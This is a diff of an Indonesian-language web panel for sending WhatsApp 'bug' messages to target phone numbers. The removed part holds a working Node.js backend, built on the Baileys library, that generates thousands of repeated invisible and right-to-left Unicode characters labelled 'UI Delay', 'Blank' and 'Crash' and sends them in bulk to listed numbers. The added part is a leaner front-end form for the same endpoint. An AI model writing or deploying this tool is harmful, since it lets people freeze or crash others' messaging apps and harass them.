@@ -1,138 +1,45 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Zionixszy</title>
+  <title>WA Bug Sender Aman</title>
   <style>
-    body {
-      background-color: #111;
-      color: white;
-      font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 2rem;
-    }
-    textarea, select, button {
-      padding: 1rem;
-      margin: 0.5rem 0;
-      border-radius: 8px;
-      border: none;
-      width: 90%;
-      max-width: 400px;
-      font-size: 1rem;
-    }
-    button {
-      background-color: #25D366;
-      color: white;
-      cursor: pointer;
-      font-weight: bold;
+    body { font-family: sans-serif; text-align: center; margin-top: 60px; }
+    input, select, button {
+      padding: 10px;
+      margin: 10px;
+      width: 300px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <h1>🧨 Kirim Bug WhatsApp</h1>
-  <textarea id="nomor" rows="6" placeholder="Daftar nomor target, pisahkan dengan ENTER (contoh: 6281234567890)"></textarea>
-  <select id="jenis">
-    <option value="ui">UI Delay</option>
+  <h1>WA Bug Sender - Aman</h1>
+  <input id="target" placeholder="Nomor Target (62xxx)">
+  <select id="variant">
     <option value="blank">Blank</option>
-    <option value="crash">Crash Ringan</option>
+    <option value="delay">Delay</option>
+    <option value="ui">UI Invisible</option>
   </select>
-  <button onclick="kirim()">KIRIM</button>  <script>
-    async function kirim() {
-      const raw = document.getElementById("nomor").value.trim();
-      const list = raw.split(/\s+/).filter(n => n.startsWith("62"));
-      const jenis = document.getElementById("jenis").value;
+  <button onclick="kirim()">Kirim</button>
+  <p id="log"></p>
 
-      if (list.length === 0) {
-        alert("Masukkan minimal 1 nomor yang diawali 62");
-        return;
-      }
+<script>
+  async function kirim() {
+    const target = document.getElementById('target').value.trim();
+    const variant = document.getElementById('variant').value;
+    const log = document.getElementById('log');
+    log.textContent = 'Mengirim...';
 
-      try {
-        const res = await fetch("/api/send-bug", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ list, jenis }),
-        });
+    const res = await fetch('/api/send-bug', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ target, variant })
+    });
 
-        const json = await res.json();
-        alert(json.status || "Berhasil dikirim!");
-      } catch (err) {
-        alert("Gagal mengirim: " + err.message);
-      }
-    }
-  </script></body>
-</html>
-
-// /api/send-bug.js
-const {
-  makeWASocket,
-  useSingleFileAuthState,
-  DisconnectReason,
-} = require("@whiskeysockets/baileys");
-const path = require("path");
-const fs = require("fs");
-
-// lokasi penyimpanan sesi
-const authFile = path.join(__dirname, "auth", "creds.json");
-fs.mkdirSync(path.dirname(authFile), { recursive: true });
-const { state, saveState } = useSingleFileAuthState(authFile);
-
-let sock;
-async function startSock() {
-  sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: true, // QR pertama kali muncul di log Vercel
-    browser: ["BugPanel", "Vercel", "1.0"],
-  });
-  sock.ev.on("creds.update", saveState);
-  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
-    if (connection === "close") {
-      const shouldReconnect =
-        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-      if (shouldReconnect) startSock();
-    }
-  });
-}
-startSock();
-
-// generator teks bug
-function buildBug(type = "ui") {
-  if (type === "blank") return "\u3164".repeat(8000);
-  if (type === "crash")
-    return "\u200F\u202E".repeat(2500) + "🔒".repeat(400);
-  return "\u200F\u202E\u2063\u3164".repeat(3000); // default UI delay
-}
-
-module.exports = async (req, res) => {
-  if (req.method !== "POST")
-    return res.status(405).json({ status: "Gunakan metode POST" });
-
-  const { list, jenis } = req.body || {};
-  if (!Array.isArray(list) || list.length === 0)
-    return res.status(400).json({ status: "List nomor kosong" });
-
-  // filter nomor valid (harus diawali 62 dan angka saja)
-  const targets = list.filter((n) => /^62\d+$/.test(n));
-
-  if (targets.length === 0)
-    return res.status(400).json({ status: "Tidak ada nomor valid" });
-
-  const bugText = buildBug(jenis);
-  const results = [];
-
-  for (const num of targets) {
-    const jid = `${num}@s.whatsapp.net`;
-    try {
-      await sock.sendMessage(jid, { text: bugText });
-      results.push({ num, ok: true });
-    } catch (e) {
-      results.push({ num, ok: false, err: e.message });
-    }
+    const data = await res.json();
+    log.textContent = data.error ? `❌ ${data.error}` : `✅ Terkirim: ${data.sid}`;
   }
-
-  res.status(200).json({ status: "Selesai", results });
-};
+</script>
+</body>
+</html>
